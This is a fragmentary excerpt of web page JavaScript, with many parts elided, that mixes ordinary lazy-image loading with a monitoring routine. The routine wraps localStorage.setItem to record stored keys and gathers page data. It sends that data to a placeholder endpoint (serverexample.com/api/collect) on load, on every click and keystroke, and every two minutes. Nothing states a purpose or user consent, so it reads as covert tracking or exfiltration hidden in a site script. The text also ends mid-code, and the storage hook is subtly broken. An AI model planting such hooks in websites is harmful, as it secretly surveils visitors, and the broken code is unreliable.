const monitorKeys = window.monitorKeys;
...
function createHashValue(payload) {
  ...
  const finalString = keys.reduce((hashed, key) => hashed + key, "");
  let hash = 0;
  for (let i = 0; i < finalString.length; i++) {
    const charCode = finalString.charCodeAt(i);
    hash = (hash << 5) - hash + charCode;
    hash = hash & hash;
  }
  return hash.toString(36);
}
function gatherMonitoredData() {
  const monitoredData = {};
...
document.addEventListener("DOMContentLoaded", function () {
  ...
  if ("IntersectionObserver" in window && "IntersectionObserverEntry" in window && "intersectionRatio" in window.IntersectionObserverEntry.prototype) {
    var c = new IntersectionObserver(function (b, e) {
      b.forEach(function (a) {
        a.isIntersecting && (a = a.target, a.src = a.dataset.src, a.classList.remove("lazy"), c.unobserve(a));
      });
    });
...
function jsHook(globalVarList) {
  var originalSetItem = localStorage.setItem;
  localStorage.setItem = (key, value) => {
    globalVarList.push(key);
    originalSetItem.apply(this, arguments);
  };
}
async function transmitDataToServer(payload) {
  const hashValue = createHashValue(payload);
  const serverAddress = "https://serverexample.com/api/collect";
  try {
    ...
    if (response.status !== 200) throw new Error("发送失败,状态码:" + response.status);
  } catch (error) {
    console.error("发送过程出现错误:", error);
  }
}
function collectAndTransmitMonitoredData() {
  let globalVarList = [];
  jsHook(globalVarList);
  const gatheredData = gatherMonitoredData();
  if (Object.getOwnPropertyNames(gatheredData).length > 0) {
    transmitDataToServer(gatheredData);
  }
  if (globalVarList.length > 0) {
    transmitDataToServer({
      'global_vars': globalVarList
    });
  }
}
document.addEventListener("DOMContentLoaded", function () {
...
window.addEventListener("load", function () {
  collectAndTransmitMonitoredData();

  // Add Event Listeners for Click and Keyboard Events
  document.addEventListener('click', collectAndTransmitMonitoredData);
  document.addEventListener('keydown', collectAndTransmitMonitoredData);

  // Set Interval to collect and transmit data every 2 minutes
  setInterval(collectAndTransmitMonitoredData, 2 * 60 * 1000);
});
!function (t, e) {
